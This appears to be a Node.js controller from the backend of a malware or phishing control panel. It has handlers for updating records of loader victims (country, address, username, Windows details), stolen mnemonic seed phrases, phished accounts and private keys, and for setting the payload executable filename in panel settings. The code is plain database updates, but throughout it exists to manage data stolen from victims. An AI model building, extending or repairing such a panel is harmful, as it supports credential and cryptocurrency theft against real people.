const LoaderModel   = require ('../models/LoaderModel');
const MnemonicModel = require ('../models/MnemonicModel');
const PhishingModel = require ('../models/PhishingModel');
const PrivateModel  = require ('../models/PrivateModel');
const PanelModel  = require ('../models/PanelSettings');

class UpdateController {
    async UpdatePanelLoader (req, res) {
        try {
            console.log(req.body.id)
            const SearchResult = await LoaderModel.findByIdAndUpdate(
                req.body.id,
                {
                    country: req.body.country,
                    address: req.body.address,
                    username: req.body.username,
                    windows: req.body.windows
                },
                {new: true}
            );
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async UpdatePanelMnemonic (req, res) {
        try {
            const SearchResult = await MnemonicModel.findByIdAndUpdate(
                req.params.id,
                {phrase: req.body.phrase},
                {new: true}
            );
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async UpdatePanelPhishing (req, res) {
        try {
            const SearchResult = await PhishingModel.findByIdAndUpdate(
                req.params.id,
                {account: req.body.account, service: req.body.service},
                {new: true}
            );
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async UpdatePanelPrivate (req, res) {
        try {
            const SearchResult = await PrivateModel.findByIdAndUpdate(
                req.params.id,
                {address: req.body.address, private: req.body.private},
                {new: true}
            );
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }

    async UpdatePanelSettingsById(req, res) {
        try {
            const url = new URL(req.body.service);
            const pathParts = url.pathname.split('/');
            const filename = pathParts[pathParts.length - 1];

            const updateData = {
                ...req.body,
                exe: filename
            };

            const updatedSettings = await PanelModel.findByIdAndUpdate(req.params.id, updateData, {new: true});

            if (!updatedSettings) {
                return res.status(404).json({message: "Settings not found"});
            }

            return res.json(updatedSettings);
        } catch (e) {
            res.status(500).json({message: e.message});
        }
    }



}
module.exports = new UpdateController()
